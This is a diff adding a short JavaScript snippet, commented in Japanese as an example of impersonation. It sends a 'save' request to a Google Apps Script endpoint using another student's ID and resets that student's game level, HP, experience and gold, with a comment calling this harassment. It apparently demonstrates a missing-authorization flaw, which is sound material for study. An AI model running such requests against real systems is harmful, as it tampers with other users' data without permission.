@@ -1,0 +1,14 @@
+// 【注意】これは「なりすまし」による他人のデータ操作の例です
+fetch(GAS_URL, {
+    method: "POST",
+    body: JSON.stringify({
+        action: "save", // 保存アクション
+        studentId: "20249999", // ターゲット（他人）のID
+        level: 1,      // レベルを1にする（嫌がらせ）
+        hp: 10,
+        exp: 0,
+        gold: 0
+    })
+})
+.then(res => res.json())
+.then(data => console.log("他人のデータを上書きしました。"));
